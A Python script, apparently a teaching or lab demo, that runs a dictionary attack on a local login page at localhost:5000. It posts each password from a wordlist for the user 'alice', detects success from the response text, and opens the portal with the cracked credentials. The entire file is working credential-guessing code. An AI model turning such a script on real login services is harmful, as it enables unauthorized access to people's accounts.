import time
import requests
import sys
import webbrowser
from tqdm import tqdm

# Đảm bảo in được emoji trên Windows
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

url = "http://localhost:5000/login"
home_url = "http://localhost:5000"
username = "alice"
wordlist_file = "wordlist.txt"

def print_banner(total_passwords):
    print("\n" + "="*60)
    print(" 📖 PHASE 3: DICTIONARY ATTACK SIMULATION")
    print("="*60)
    print(f" Target URL   : {url}")
    print(f" Target User  : {username}")
    print(f" Word count   : {total_passwords}")
    print("-" * 60)

def main():
    start_time = time.time()
    attempts = 0
    found_password = None
    found_at = None

    try:
        with open(wordlist_file, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f" [!] Error: {wordlist_file} not found.")
        return

    total_passwords = len(passwords)
    print_banner(total_passwords)

    pbar = tqdm(total=total_passwords, desc=" [SCANNING]", unit="pwd", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]')

    for password in passwords:
        attempts += 1
        tqdm.write(f" Trying #{attempts}/{total_passwords}: {password}")
        time.sleep(0.05) # Thời gian thử như phiên bản cũ

        try:
            response = requests.post(url, data={"username": username, "password": password}, timeout=3)
        except:
            pbar.close()
            print("\n [!] Error: Server is not running.")
            return

        # Kiểm tra kết quả thành công TRƯỚC khi update progress bar để dừng chính xác
        if "access granted" in response.text.lower() or "authentication successful" in response.text.lower():
            found_password = password
            found_at = attempts
            # Đẩy thanh progress lên 100%
            remaining = total_passwords - pbar.n
            if remaining > 0:
                pbar.update(remaining)
            pbar.close()
            print(f"\n [✅] SUCCESS! Password found at try #{found_at}: {found_password}")
            break

        pbar.update(1)

    total_time = time.time() - start_time

    if found_password:
        print("\n" + "="*60)
        print(" DICTIONARY ATTACK RESULT")
        print(f" Attempts     : {attempts}")
        print(f" Found at     : {found_at}/{total_passwords}")
        print(f" Time taken   : {total_time:.2f}s")
        print(f" Password     : {found_password}")
        print("-" * 60)
        print(" [!] Opening web portal...")
        print(" [i] Status: COMPROMISED. Accessing account...")
        time.sleep(1.5)
        webbrowser.open(f"http://localhost:5000/?username={username}&password={found_password}&demo_success=true")
    else:
        pbar.close()
        print("\n [❌] FAILED: Password not found in dictionary.")
    print("="*60 + "\n")

if __name__ == "__main__":
    main()